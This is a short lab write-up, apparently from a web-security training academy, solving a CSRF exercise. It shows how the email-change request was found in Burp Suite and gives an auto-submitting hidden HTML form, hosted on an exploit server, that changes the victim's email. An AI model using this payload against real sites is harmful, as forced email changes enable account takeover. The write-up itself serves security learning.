
# CSRF vulnerability with no defenses

## What do we know?
- site is vulnerable to Cross Site Request Forgery attack
- there are no defences against it

## What do we have to do?
- change viewer's email address

## Solution:
Firstly I had logged in to website with given credentials and I tried changing my password to see how website handles this interaction.
In Burp Suite I saw that website sends POST request to the server with body containing `email=myemail%40m`.

At this point in time i knew that all I had to do is: run script from my website, which sends similar request to the server, but with new email address.

I went to exploitation server and created simple website containing malicious code.

## Final payload looks like this:
File:

`/exploit.html`

Head:

`HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8`

Body: 
```
<html>
  <body>
    <form action="https://"lab-id-here".web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="new@email" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html> 
```
